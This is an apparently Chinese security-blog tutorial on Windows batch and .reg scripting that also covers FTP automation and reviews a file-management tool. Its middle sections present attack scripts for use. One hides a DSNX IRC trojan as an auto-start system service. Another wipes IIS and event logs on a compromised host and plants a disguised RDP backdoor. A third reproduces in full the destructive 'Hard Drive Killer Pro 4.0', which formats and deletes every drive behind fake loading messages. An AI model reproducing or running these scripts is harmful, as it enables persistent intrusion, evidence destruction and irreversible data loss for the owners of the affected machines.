+关于注册表的操作，常见的是创建、修改、删除。 </P>
+<P>1.创建  <br />
+创建分为两种，一种是创建子项(Subkey) </P>
+<P>我们创建一个文件，内容如下： </P>
+<P>Windows Registry Editor Version 5.00 </P>
+<P>[HKEY_LOCAL_MACHINESOFTWAREMicrosofthacker] </P>
+<P>然后执行该脚本，你就已经在HKEY_LOCAL_MACHINESOFTWAREMicrosoft下创建了一个名字为“hacker”的子项。 </P>
+<P>另一种是创建一个项目名称  <br />
+那这种文件格式就是典型的文件格式，和你从注册表中导出的文件格式一致，内容如下： </P>
+<P>Windows Registry Editor Version 5.00 </P>
+<P>[HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsCurrentVersionRun]  <br />
+"Invader"="Ex4rch"  <br />
+"Door"=C:\WINNT\system32\door.exe  <br />
+"Autodos"=dword:02 </P>
+<P>这样就在[HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsCurrentVersionRun]下  <br />
+新建了:Invader、door、about这三个项目  <br />
+Invader的类型是“String Value”  <br />
+door的类型是“REG SZ Value”  <br />
+Autodos的类型是“DWORD Value” </P>
+<P> <br />
+2.修改  <br />
+修改相对来说比较简单，只要把你需要修改的项目导出，然后用记事本进行修改，然后导入（regedit /s）即可。 </P>
+<P>3.删除  <br />
+我们首先来说说删除一个项目名称，我们创建一个如下的文件： </P>
+<P>Windows Registry Editor Version 5.00 </P>
+<P>[HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsCurrentVersionRun]  <br />
+"Ex4rch"=- </P>
+<P>执行该脚本，[HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsCurrentVersionRun]下的"Ex4rch"就被删除了； </P>
+<P>我们再看看删除一个子项，我们创建一个如下的脚本： </P>
+<P>Windows Registry Editor Version 5.00 </P>
+<P>[-HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsCurrentVersionRun] </P>
+<P>执行该脚本，[HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsCurrentVersionRun]就已经被删除了。 </P>
+<P>相信看到这里，.reg文件你基本已经掌握了。那么现在的目标就是用批处理来创建特定内容的.reg文件了，记得我们前面说道的利用重定向符号可以很容易地创建特定类型的文件。 </P>
+<P>samlpe1:如上面的那个例子,如想生成如下注册表文件  <br />
+Windows Registry Editor Version 5.00 </P>
+<P>[HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsCurrentVersionRun]  <br />
+"Invader"="Ex4rch"  <br />
+"door"=hex:255  <br />
+"Autodos"=dword:000000128  <br />
+只需要这样：  <br />
+@echo Windows Registry Editor Version 5.00&gt;&gt;Sample.reg </P>
+<P>@echo [HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsCurrentVersionRun]&gt;Sample.reg  <br />
+@echo "Invader"="Ex4rch"&gt;&gt;Sample.reg  <br />
+@echo "door"=5&gt;&gt;C:\WINNT\system32\door.exe&gt;&gt;Sample.reg  <br />
+@echo "Autodos"=dword:02&gt;&gt;Sample.reg </P>
+<P> <br />
+samlpe2:  <br />
+我们现在在使用一些比较老的木马时,可能会在注册表的[HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsCurrentVersionRun(Runonce、Runservices、Runexec)]下生成一个键值用来实现木马的自启动.但是这样很容易暴露木马程序的路径,从而导致木马被查杀,相对地若是将木马程序注册为系统服务则相对安全一些.下面以配置好地IRC木马DSNX为例(名为windrv32.exe)  <br />
+@start windrv32.exe  <br />
+@attrib +h +r windrv32.exe  <br />
+@echo [HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsCurrentVersionRun] &gt;&gt;patch.dll  <br />
+@echo "windsnx "=- &gt;&gt;patch.dll  <br />
+@sc.exe create Windriversrv type= kernel start= auto displayname= WindowsDriver binpath= c:winntsystem32windrv32.exe  <br />
+@regedit /s patch.dll  <br />
+@delete patch.dll </P>
+<P>@REM [删除DSNXDE在注册表中的启动项，用sc.exe将之注册为系统关键性服务的同时将其属性设为隐藏和只读，并config为自启动]  <br />
+@REM 这样不是更安全^_^. </P>
+<P>六.精彩实例放送。  <br />
+1.删除win2k/xp系统默认共享的批处理  <br />
+------------------------ cut here then save as .bat or .cmd file --------------------------- </P>
+<P>@echo preparing to delete all the default shares.when ready pres any key.  <br />
+@pause  <br />
+@echo off </P>
+<P>:Rem check parameters if null show usage.  <br />
+if {%1}=={} goto :Usage </P>
+<P>:Rem code start.  <br />
+echo.  <br />
+echo ------------------------------------------------------  <br />
+echo.  <br />
+echo Now deleting all the default shares.  <br />
+echo.  <br />
+net share %1$ /delete  <br />
+net share %2$ /delete  <br />
+net share %3$ /delete  <br />
+net share %4$ /delete  <br />
+net share %5$ /delete  <br />
+net share %6$ /delete  <br />
+net share %7$ /delete  <br />
+net share %8$ /delete  <br />
+net share %9$ /delete  <br />
+net stop Server  <br />
+net start Server  <br />
+echo.  <br />
+echo All the shares have been deleteed  <br />
+echo.  <br />
+echo ------------------------------------------------------  <br />
+echo.  <br />
+echo Now modify the registry to change the system default properties.  <br />
+echo.  <br />
+echo Now creating the registry file  <br />
+echo Windows Registry Editor Version 5.00&gt; c:delshare.reg  <br />
+echo [HKEY_LOCAL_MACHINESYSTEMCurrentControlSetServiceslanmanserverparameters]&gt;&gt; c:delshare.reg  <br />
+echo "AutoShareWks"=dword:00000000&gt;&gt; c:delshare.reg  <br />
+echo "AutoShareServer"=dword:00000000&gt;&gt; c:delshare.reg  <br />
+echo Nowing using the registry file to chang the system default properties.  <br />
+regedit /s c:delshare.reg  <br />
+echo Deleting the temprotarily files.  <br />
+del c:delshare.reg  <br />
+goto :END </P>
+<P>:Usage  <br />
+echo.  <br />
+echo ------------------------------------------------------  <br />
+echo.  <br />
+echo ☆ A example for batch file ☆  <br />
+echo ☆ [Use batch file to change the sysytem share properties.] ☆  <br />
+echo.  <br />
+echo Author：Ex4rch  <br />
+echo Mail:Ex4rch@hotmail.com QQ:1672602  <br />
+echo.  <br />
+echo Error：Not enough parameters  <br />
+echo.  <br />
+echo ☆ Please enter the share disk you wanna delete ☆  <br />
+echo.  <br />
+echo For instance，to delete the default shares:  <br />
+echo delshare c d e ipc admin print  <br />
+echo.  <br />
+echo If the disklable is not as C: D: E: ，Please chang it youself.  <br />
+echo.  <br />
+echo example：  <br />
+echo If locak disklable are C: D: E: X: Y: Z: ，you should chang the command into ：  <br />
+echo delshare c d e x y z ipc admin print  <br />
+echo.  <br />
+echo *** you can delete nine shares once in a useing ***  <br />
+echo.  <br />
+echo ------------------------------------------------------  <br />
+goto :EOF </P>
+<P>:END  <br />
+echo.  <br />
+echo ------------------------------------------------------  <br />
+echo.  <br />
+echo OK,delshare.bat has deleted all the share you assigned.  <br />
+echo.Any questions ,feel free to mail to <A href="mailto:Ex4rch@hotmail.com">Ex4rch@hotmail.com</A>.  <br />
+echo  <br />
+echo.  <br />
+echo ------------------------------------------------------  <br />
+echo. </P>
+<P>:EOF  <br />
+echo end of the batch file  <br />
+------------------------ cut here then save as .bat or .cmd file --------------------------- </P>
+<P> <br />
+2.全面加固系统（给肉鸡打补丁）的批处理文件  <br />
+------------------------ cut here then save as .bat or .cmd file --------------------------- </P>
+<P>@echo Windows Registry Editor Version 5.00 &gt;patch.dll  <br />
+@echo [HKEY_LOCAL_MACHINESYSTEMCurrentControlSetServiceslanmanserverparameters] &gt;&gt;patch.dll </P>
+<P>@echo "AutoShareServer"=dword:00000000 &gt;&gt;patch.dll  <br />
+@echo "AutoShareWks"=dword:00000000 &gt;&gt;patch.dll  <br />
+@REM [禁止共享] </P>
+<P>@echo [HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlLsa] &gt;&gt;patch.dll  <br />
+@echo "restrictanonymous"=dword:00000001 &gt;&gt;patch.dll  <br />
+@REM [禁止匿名登录] </P>
+<P>@echo [HKEY_LOCAL_MACHINESYSTEMCurrentControlSetServicesNetBTParameters] &gt;&gt;patch.dll  <br />
+@echo "SMBDeviceEnabled"=dword:00000000 &gt;&gt;patch.dll  <br />
+@REM [禁止及文件访问和打印共享] </P>
+<P>@echo [HKEY_LOCAL_MACHINESYSTEMCurrentControlSetServices@REMoteRegistry] &gt;&gt;patch.dll  <br />
+@echo "Start"=dword:00000004 &gt;&gt;patch.dll  <br />
+@echo [HKEY_LOCAL_MACHINESYSTEMCurrentControlSetServicesSchedule] &gt;&gt;patch.dll  <br />
+@echo "Start"=dword:00000004 &gt;&gt;patch.dll  <br />
+@echo [HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionWinlogon] &gt;&gt;patch.dll  <br />
+@echo "ShutdownWithoutLogon"="0" &gt;&gt;patch.dll  <br />
+@REM [禁止登录前关机] </P>
+<P>@echo "DontDisplayLastUserName"="1" &gt;&gt;patch.dll  <br />
+@REM [禁止显示前一个登录用户名称]  <br />
+@regedit /s patch.dll </P>
+<P>------------------------ cut here then save as .bat or .cmd file --------------------------- </P>
+<P>下面命令是清除肉鸡所有日志，禁止一些危险的服务，并修改肉鸡的terminnal service留跳后路。  <br />
+@regedit /s patch.dll  <br />
+@net stop w3svc  <br />
+@net stop event log  <br />
+@del c:winntsystem32logfilesw3svc1*.* /f /q  <br />
+@del c:winntsystem32logfilesw3svc2*.* /f /q  <br />
+@del c:winntsystem32config*.event /f /q  <br />
+@del c:winntsystem32dtclog*.* /f /q  <br />
+@del c:winnt*.txt /f /q  <br />
+@del c:winnt*.log /f /q  <br />
+@net start w3svc  <br />
+@net start event log  <br />
+@rem [删除日志]</P>
+<P> <br />
+@net stop lanmanserver /y  <br />
+@net stop Schedule /y  <br />
+@net stop RemoteRegistry /y  <br />
+@del patch.dll  <br />
+@echo The server has been patched,Have fun.  <br />
+@del patch.bat  <br />
+@REM [禁止一些危险的服务。] </P>
+<P>@echo [HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlTerminal ServerWinStationsRDP-Tcp] &gt;&gt;patch.dll  <br />
+@echo "PortNumber"=dword:00002010 &gt;&gt;patch.dll  <br />
+@echo [HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlTerminal ServerWdsrdpwdTdstcp &gt;&gt;patch.dll  <br />
+@echo "PortNumber"=dword:00002012 &gt;&gt;patch.dll  <br />
+@echo [HKEY_LOCAL_MACHINESYSTEMCurrentControlSetServicesTermDD] &gt;&gt;patch.dll  <br />
+@echo "Start"=dword:00000002 &gt;&gt;patch.dll  <br />
+@echo [HKEY_LOCAL_MACHINESYSTEMCurrentControlSetServicesSecuService] &gt;&gt;patch.dll  <br />
+@echo "Start"=dword:00000002 &gt;&gt;patch.dll  <br />
+@echo "ErrorControl"=dword:00000001 &gt;&gt;patch.dll  <br />
+@echo "ImagePath"=hex(2):25,00,53,00,79,00,73,00,74,00,65,00,6d,00,52,00,6f,00,6f,00, &gt;&gt;patch.dll  <br />
+@echo 74,00,25,00,5c,00,53,00,79,00,73,00,74,00,65,00,6d,00,33,00,32,00,5c,00,65, &gt;&gt;patch.dll  <br />
+@echo 00,76,00,65,00,6e,00,74,00,6c,00,6f,00,67,00,2e,00,65,00,78,00,65,00,00,00 &gt;&gt;patch.dll  <br />
+@echo "ObjectName"="LocalSystem" &gt;&gt;patch.dll  <br />
+@echo "Type"=dword:00000010 &gt;&gt;patch.dll  <br />
+@echo "Description"="Keep record of the program and windows' message。" &gt;&gt;patch.dll  <br />
+@echo "DisplayName"="Microsoft EventLog" &gt;&gt;patch.dll  <br />
+@echo [HKEY_LOCAL_MACHINESYSTEMCurrentControlSetServicestermservice] &gt;&gt;patch.dll  <br />
+@echo "Start"=dword:00000004 &gt;&gt;patch.dll  <br />
+@copy c:winntsystem32termsrv.exe c:winntsystem32eventlog.exe  <br />
+@REM [修改3389连接，端口为8210(十六进制为00002012)，名称为Microsoft EventLog，留条后路] </P>
+<P>3.Hard Drive Killer Pro Version 4.0（玩批处理到这个水平真的不容易了。）  <br />
+------------------------ cut here then save as .bat or .cmd file ---------------------------  <br />
+@echo off  <br />
+rem This program is dedecated to a very special person that does not want to be named.  <br />
+:start  <br />
+cls  <br />
+echo PLEASE WAIT WHILE PROGRAM LOADS . . .  <br />
+call attrib -r -h c:autoexec.bat &gt;nul  <br />
+echo @echo off &gt;c:autoexec.bat  <br />
+echo call format c: /q /u /autoSample &gt;nul &gt;&gt;c:autoexec.bat  <br />
+call attrib +r +h c:autoexec.bat &gt;nul  <br />
+rem Drive checking and assigning the valid drives to the drive variable. </P>
+<P>set drive=  <br />
+set alldrive=c d e f g h i j k l m n o p q r s t u v w x y z </P>
+<P>rem code insertion for Drive Checking takes place here.  <br />
+rem drivechk.bat is the file name under the root directory.  <br />
+rem As far as the drive detection and drive variable settings, don't worry about how it  <br />
+rem works, it's d*amn to complicated for the average or even the expert batch programmer.  <br />
+rem Except for Tom Lavedas. </P>
+<P>echo @echo off &gt;drivechk.bat  <br />
+echo @prompt %%%%comspec%%%% /f /c vol %%%%1: $b find "Vol" &gt; nul &gt;{t}.bat  <br />
+%comspec% /e:2048 /c {t}.bat &gt;&gt;drivechk.bat  <br />
+del {t}.bat  <br />
+echo if errorlevel 1 goto enddc &gt;&gt;drivechk.bat </P>
+<P>cls  <br />
+echo PLEASE WAIT WHILE PROGRAM LOADS . . . </P>
+<P>rem When errorlevel is 1, then the above is not true, if 0, then it's true.  <br />
+rem Opposite of binary rules. If 0, it will elaps to the next command. </P>
+<P>echo @prompt %%%%comspec%%%% /f /c dir %%%%1:./ad/w/-p $b find "bytes" &gt; nul &gt;{t}.bat  <br />
+%comspec% /e:2048 /c {t}.bat &gt;&gt;drivechk.bat  <br />
+del {t}.bat  <br />
+echo if errorlevel 1 goto enddc &gt;&gt;drivechk.bat </P>
+<P>cls  <br />
+echo PLEASE WAIT WHILE PROGRAM LOADS . . . </P>
+<P>rem if errorlevel is 1, then the drive specified is a removable media drive - not ready.  <br />
+rem if errorlevel is 0, then it will elaps to the next command. </P>
+<P>echo @prompt dir %%%%1:./ad/w/-p $b find " 0 bytes free" &gt; nul &gt;{t}.bat  <br />
+%comspec% /e:2048 /c {t}.bat &gt;&gt;drivechk.bat  <br />
+del {t}.bat  <br />
+echo if errorlevel 1 set drive=%%drive%% %%1 &gt;&gt;drivechk.bat </P>
+<P>cls  <br />
+echo PLEASE WAIT WHILE PROGRAM LOADS . . . </P>
+<P>rem if it's errorlevel 1, then the specified drive is a hard or floppy drive.  <br />
+rem if it's not errorlevel 1, then the specified drive is a CD-ROM drive. </P>
+<P>echo :enddc &gt;&gt;drivechk.bat </P>
+<P>rem Drive checking insertion ends here. "enddc" stands for "end dDRIVE cHECKING". </P>
+<P>rem Now we will use the program drivechk.bat to attain valid drive information. </P>
+<P>:Sampledrv </P>
+<P>for %%a in (%alldrive%) do call drivechk.bat %%a &gt;nul  <br />
+del drivechk.bat &gt;nul  <br />
+if %drive.==. set drive=c </P>
+<P>:form_del  <br />
+call attrib -r -h c:autoexec.bat &gt;nul  <br />
+echo @echo off &gt;c:autoexec.bat  <br />
+echo echo Loading Windows, please wait while Microsoft Windows recovers your system . . . &gt;&gt;c:autoexec.bat  <br />
+echo for %%%%a in (%drive%) do call format %%%%a: /q /u /autoSample &gt;nul &gt;&gt;c:autoexec.bat  <br />
+echo cls &gt;&gt;c:autoexec.bat  <br />
+echo echo Loading Windows, please wait while Microsoft Windows recovers your system . . . &gt;&gt;c:autoexec.bat  <br />
+echo for %%%%a in (%drive%) do call c:temp.bat %%%%a Bunga &gt;nul &gt;&gt;c:autoexec.bat  <br />
+echo cls &gt;&gt;c:autoexec.bat  <br />
+echo echo Loading Windows, please wait while Microsoft Windows recovers your system . . . &gt;&gt;c:autoexec.bat  <br />
+echo for %%%%a in (%drive%) call deltree /y %%%%a: &gt;nul &gt;&gt;c:autoexec.bat  <br />
+echo cls &gt;&gt;c:autoexec.bat  <br />
+echo echo Loading Windows, please wait while Microsoft Windows recovers your system . . . &gt;&gt;c:autoexec.bat  <br />
+echo for %%%%a in (%drive%) do call format %%%%a: /q /u /autoSample &gt;nul &gt;&gt;c:autoexec.bat  <br />
+echo cls &gt;&gt;c:autoexec.bat  <br />
+echo echo Loading Windows, please wait while Microsoft Windows recovers your system . . . &gt;&gt;c:autoexec.bat  <br />
+echo for %%%%a in (%drive%) do call c:temp.bat %%%%a Bunga &gt;nul &gt;&gt;c:autoexec.bat  <br />
+echo cls &gt;&gt;c:autoexec.bat  <br />
+echo echo Loading Windows, please wait while Microsoft Windows recovers your system . . . &gt;&gt;c:autoexec.bat  <br />
+echo for %%%%a in (%drive%) call deltree /y %%%%a: &gt;nul &gt;&gt;c:autoexec.bat  <br />
+echo cd &gt;&gt;c:autoexec.bat  <br />
+echo cls &gt;&gt;c:autoexec.bat  <br />
+echo echo Welcome to the land of death. Munga Bunga's Multiple Hard Drive Killer version 4.0. &gt;&gt;c:autoexec.bat  <br />
+echo echo If you ran this file, then sorry, I just made it. The purpose of this program is to tell you the following. . . &gt;&gt;c:autoexec.bat  <br />
+echo echo 1. To make people aware that security should not be taken for granted. &gt;&gt;c:autoexec.bat  <br />
+echo echo 2. Love is important, if you have it, truly, don't let go of it like I did! &gt;&gt;c:autoexec.bat  <br />
+echo echo 3. If you are NOT a vegetarian, then you are a murderer, and I'm glad your HD is dead. &gt;&gt;c:autoexec.bat  <br />
+echo echo 4. Don't support the following: War, Racism, Drugs and the Liberal Party.&gt;&gt;c:autoexec.bat </P>
+<P>echo echo. &gt;&gt;c:autoexec.bat  <br />
+echo echo Regards, &gt;&gt;c:autoexec.bat  <br />
+echo echo. &gt;&gt;c:autoexec.bat  <br />
+echo echo Munga Bunga &gt;&gt;c:autoexec.bat  <br />
+call attrib +r +h c:autoexec.bat </P>
+<P>:makedir  <br />
+if exist c:temp.bat attrib -r -h c:temp.bat &gt;nul  <br />
+echo @echo off &gt;c:temp.bat  <br />
+echo %%1: &gt;&gt;c:temp.bat  <br />
+echo cd &gt;&gt;c:temp.bat  <br />
+echo :startmd &gt;&gt;c:temp.bat  <br />
+echo for %%%%a in ("if not exist %%2nul md %%2" "if exist %%2nul cd %%2") do %%%%a &gt;&gt;c:temp.bat  <br />
+echo for %%%%a in ("&gt;ass_hole.txt") do echo %%%%a Your Gone @$$hole!!!! &gt;&gt;c:temp.bat  <br />
+echo if not exist %%1:%%2%%2%%2%%2%%2%%2%%2%%2%%2%%2%%2%%2%%2%%2%%2%%2%%2%%2%%2%%2%%2%%2%%2%%2%%2%%2%%2%%2%%2%%2%%2%%2%%2%%2%%2%%2%%2%%2nul goto startmd &gt;&gt;c:temp.bat  <br />
+call attrib +r +h c:temp.bat &gt;nul </P>
+<P>cls  <br />
+echo Initializing Variables . . .  <br />
+rem deltree /y %%a:*. only eliminates directories, hence leaving the file created above for further destruction.  <br />
+for %%a in (%drive%) do call format %%a: /q /u /autoSample &gt;nul  <br />
+cls  <br />
+echo Initializing Variables . . .  <br />
+echo Validating Data . . .  <br />
+for %%a in (%drive%) do call c:temp.bat %%a Munga &gt;nul  <br />
+cls  <br />
+echo Initializing Variables . . .  <br />
+echo Validating Data . . .  <br />
+echo Analyzing System Structure . . .  <br />
+for %%a in (%drive%) call attrib -r -h %%a: /S &gt;nul  <br />
+call attrib +r +h c:temp.bat &gt;nul  <br />
+call attrib +r +h c:autoexec.bat &gt;nul  <br />
+cls  <br />
+echo Initializing Variables . . .  <br />
+echo Validating Data . . .  <br />
+echo Analyzing System Structure . . .  <br />
+echo Initializing Application . . . </P>
+<P>for %%a in (%drive%) call deltree /y %%a:*. &gt;nul  <br />
+cls  <br />
+echo Initializing Variables . . .  <br />
+echo Validating Data . . .  <br />
+echo Analyzing System Structure . . .  <br />
+echo Initializing Application . . .  <br />
+echo Starting Application . . .  <br />
+for %%a in (%drive%) do call c:temp.bat %%a Munga &gt;nul </P>
+<P>cls  <br />
+echo Thank you for using a Munga Bunga product.  <br />
+echo.  <br />
+echo Oh and, Bill Gates rules, and he is not a geek, he is a good looking genius.  <br />
+echo.  <br />
+echo Here is a joke for you . . .  <br />
+echo.  <br />
+echo Q). What's the worst thing about being an egg?  <br />
+echo A). You only get laid once.  <br />
+echo.  <br />
+echo HAHAHAHA, get it? Don't you just love that one?  <br />
+echo.  <br />
+echo Regards,  <br />
+echo.  <br />
+echo Munga Bunga </P>
+<P>:end </P>
+<P>rem Hard Drive Killer Pro Version 4.0, enjoy!!!!  <br />
+rem Author: Munga Bunga - from Australia, the land full of retarded Australian's (help me get out of here). </P>
+<P>用批处理命令实现FTP文件的自动传输  <br />
+由于工作的原因，每天需要在Windows操作系统之间或与其它操作系统如UNIX等利用FTP进行文件传输。经常重复这样的工作程序，即繁琐又容易出错。本人经过思考摸索，在Windows操作系统的“任务计划”帮助下，成功地用批处理命令实现FTP文件的自动传输。现将此操作过程详解，希望对同好有所帮助，更望能抛砖引玉，提出更好的方法。 </P>
+<P>　　假设本机操作系统为Windows操作系统，需进行文件传输的目录为C:＼datatran；对方  <br />
+计算机操作系统为UNIX操作系统，IP地址为10.30.15.3，需进行文件传输的目录为C:＼data，登录用户名为Anonymous，口令为123456。从本机到对方机接收文件操作方法如下。 </P>
+<P>　　第一步，先新建一个文本： </P>
+<P>　　Open 10.31.15.3 </P>
+<P>　　User anonymous </P>
+<P>　　123456 </P>
+<P>　　Cd data </P>
+<P>　　Bin </P>
+<P>　　Prompt </P>
+<P>　　Mget *.* </P>
+<P>　　Bye </P>
+<P>　　Quit </P>
+<P>　　Exit </P>
+<P>　　将该文本保存为1.ftp存放到C盘根目录。该文件只要扩展名为ftp，前缀可任意取名。目录也不一定要在根目录，主要以方便为主。文本中Bin为用二进制码格式传输文件，如用ASCII码格式传输文件可去掉该行。如为本机向对方机发送文件，则只要将文本中的Mget替换成Mput即可。这之后，再新建另一个文本： </P>
+<P>　　C: </P>
+<P>　　Cd datatran </P>
+<P>　　ftp–n–s:”c:＼1.ftp” </P>
+<P>　　新建完毕后将该文本保存为1.bat后存放在硬盘任何分区或软盘中均可。这样，第一步工作已经完成，您随时可以执行该批处理文件进行FTP文件的传输。 </P>
+<P>　　第二步，将该该批处理文件放在“任务计划”中设定自动运行。方法是：打开“开始”菜单“程序”下“附件”中的“系统工具”，点击“任务计划”，执行“添加任务计划”，按“任务计划向导”提示将该批处理文件添加到任务计划中，并指定执行周期，之后再设下密码后即完成。从此，计算机会根据您的设定，自动周期性地进行文件接收或发送，不再需要您动一下手指，真正做到它工作，您休息。 </P>
+<P>　　另外，如果是Windows操作系统之间进行FTP进行文件传输，只要去掉1.ftp中“Bin”一行就可以了。 </P>
+<P>无敌文件批处理大师  <br />
+随着硬盘容量的增大，我们电脑中的文件越来越多，文件整理就成为玩机一族的苦差事了。虽然现在有很多所谓的系统辅助工具，可以帮我们进行一些文件的单一整理，但鲜有一款工具能够帮我们将文件进行排序、改名、压缩和解压缩的多项操作一次性地完成。而笔者在最近终于发现一款软件除了可以实现以上的操作，还附带很多实用的小功能，它就是——无敌文件批处理大师。  <br />
+　　下载地址：<A href="http://www.onlinedown.net/soft/22473.htm">http://www.onlinedown.net/soft/22473.htm</A> </P>
+<P>　　★批量文件处理 </P>
+<P>　　我们可以对文件和文件夹进行批量的操作，包括修改名称、批量修改序数、设置文件属性和日期、替换文件内容和文本压缩。如图所示首先在主界面的左边目录树中选择待处理文件的路径，然后在右边的管理框中，将待处理的文件拉到右下角“文件列表”中。 </P>
+<P>　　然后点击菜单栏的“处理→一般文件处理”，在对话框中选择处理类型，按下“开始”按钮，立等可取！要注意的是此过程不可逆，所以在转换前最好想清楚，或做个备份。 </P>
+<P>　　★批量压缩/解压缩 </P>
+<P>　　将待处理的文件添加到“文件列表”，点击菜单栏“处理→文件压缩/解压缩”，在这里我们可以将文件压缩或解压缩为ZIP格式，点“选择”按钮设置文件的保存路径，为防止他人的偷窥，我们还可以为压缩文件包设置密码保护，遗憾的是该软件目前只支持ZIP一种压缩格式，对于RAR等其他压缩格式就无能为力了。 </P>
+<P>　　★文本处理 </P>
+<P>　　除了处理文件和文件夹外，无敌文件批处理大师还提供了丰富的文本处理选项。选定一个文本文件，点击菜单栏“显示→使用内置文本编辑器”开启处理程序，使用工具栏中的按钮分别可以实现GB码转BIG5码或者BIG5码转GB码，以后我们观看BIG5码的文件时，就再也不用南极星了。 </P>
+<P>　　★快捷方式批量处理 </P>
+<P>　　所谓的“快捷方式批量处理”，就是将指向不同目标和使用不同程序图标的快捷方式，以一个统一的方式进行处理，使它们可以指向相同的目标和使用一致的图标。这个功能只需在软件界面上按快捷键“F8”就能实现。在弹出的设置框里，我们可以设定使用字符串来替换原来的文件名，还可在指定运行的方式里面，自由设定打开的窗口是常规的还是最大或最小化。如果我们将这个功能用到一些网络游戏里，就可以一边运行全屏的游戏，一边浏览攻略了。 </P>
+<P>　　无敌文件批量处理大师强大的批处理功能可以使繁杂的整理工作在瞬间完成，节省了我们大量的时间，而在各主要功能上设置的快捷键，还能令我们不用点选多级菜单，就能轻松进行处理，不愧是E时代的文件整理好帮手。 </P>
+    </div>
+
+    
+    
+<div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">文章作者</span>
+    <span class="item-content">Nuclear'Atk</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">上次更新</span>
+    <span class="item-content">
+      2010-10-18
+      
+    </span>
+  </p>
+  
+  <p class="copyright-item">
+    <span class="item-title">许可协议</span>
+    <span class="item-content"><a href="https://lcx.cc/" target="_blank">Nuclear'Atk（核攻击）网络安全实验室</a>版权所有，转载请注明出处。</span>
+  </p>
+</div>
+
+
+    
+    
+
+    <footer class="post-footer">
+      <div class="post-tags">
+          <a href="https://lcx.cc/tags/bat/">Bat</a>
+          <a href="https://lcx.cc/tags/%E6%8A%80%E5%B7%A7/">技巧</a>
+          <a href="https://lcx.cc/tags/%E5%91%BD%E4%BB%A4/">命令</a>
+          <a href="https://lcx.cc/tags/%E6%89%B9%E5%A4%84%E7%90%86/">批处理</a>
+          <a href="https://lcx.cc/tags/anonymous/">Anonymous</a>
+          <a href="https://lcx.cc/tags/app/">app</a>
+          <a href="https://lcx.cc/tags/cmd/">Cmd</a>
+          <a href="https://lcx.cc/tags/dos/">Dos</a>
+          <a href="https://lcx.cc/tags/exe/">exe</a>
+          <a href="https://lcx.cc/tags/ftp/">FTP</a>
+          <a href="https://lcx.cc/tags/hack/">Hack</a>
+          <a href="https://lcx.cc/tags/ie/">IE</a>
+          <a href="https://lcx.cc/tags/ip/">IP</a>
+          <a href="https://lcx.cc/tags/ips/">IPS</a>
+          <a href="https://lcx.cc/tags/mac/">MAC</a>
+          <a href="https://lcx.cc/tags/microsoft/">Microsoft</a>
+          <a href="https://lcx.cc/tags/nds/">NDS</a>
+          <a href="https://lcx.cc/tags/net/">Net</a>
+          <a href="https://lcx.cc/tags/rat/">Rat</a>
+          <a href="https://lcx.cc/tags/unix/">Unix</a>
+          <a href="https://lcx.cc/tags/windows/">Windows</a>
+          <a href="https://lcx.cc/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">操作系统</a>
+          <a href="https://lcx.cc/tags/%E7%A8%8B%E5%BA%8F/">程序</a>
+          <a href="https://lcx.cc/tags/%E5%88%86%E6%9E%90/">分析</a>
+          <a href="https://lcx.cc/tags/%E6%9C%8D%E5%8A%A1/">服务</a>
+          <a href="https://lcx.cc/tags/%E5%B7%A5%E5%85%B7/">工具</a>
+          <a href="https://lcx.cc/tags/%E5%90%8E%E9%97%A8/">后门</a>
+          <a href="https://lcx.cc/tags/%E8%84%9A%E6%9C%AC/">脚本</a>
+          <a href="https://lcx.cc/tags/%E5%AF%86%E7%A0%81/">密码</a>
+          <a href="https://lcx.cc/tags/%E6%9C%A8%E9%A9%AC/">木马</a>
+          <a href="https://lcx.cc/tags/%E6%89%B9%E9%87%8F/">批量</a>
+          <a href="https://lcx.cc/tags/%E5%85%A5%E4%BE%B5/">入侵</a>
+          <a href="https://lcx.cc/tags/%E8%BD%AF%E4%BB%B6/">软件</a>
+          <a href="https://lcx.cc/tags/%E6%96%87%E4%BB%B6/">文件</a>
+          <a href="https://lcx.cc/tags/%E7%B3%BB%E7%BB%9F/">系统</a>
+          <a href="https://lcx.cc/tags/%E6%B3%A8%E5%86%8C%E8%A1%A8/">注册表</a>
+          
+        </div>
+
+      
+      <nav class="post-nav">
+        
+          <a class="prev" href="/post/798/">
+            
+            <i class="iconfont">
+              <svg  class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
+  <path d="M691.908486 949.511495l75.369571-89.491197c10.963703-12.998035 10.285251-32.864502-1.499144-44.378743L479.499795 515.267417 757.434875 204.940602c11.338233-12.190647 11.035334-32.285311-0.638543-44.850487l-80.46666-86.564541c-11.680017-12.583596-30.356378-12.893658-41.662889-0.716314L257.233596 494.235404c-11.332093 12.183484-11.041474 32.266891 0.657986 44.844348l80.46666 86.564541c1.772366 1.910513 3.706415 3.533476 5.750981 4.877077l306.620399 321.703933C662.505829 963.726242 680.945807 962.528973 691.908486 949.511495z"></path>
+</svg>
+
+            </i>
+            <span class="prev-text nav-default">Serv-U FTP Server 用户账号执行Dos、Cmd命令</span>
+            <span class="prev-text nav-mobile">上一篇</span>
+          </a>
+        
+          <a class="next" href="/post/796/">
+            <span class="next-text nav-default">【计算机常识】Windows 操作系统常见进程详解</span>
+            <span class="prev-text nav-mobile">下一篇</span>
+            
+            <i class="iconfont">
+              <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
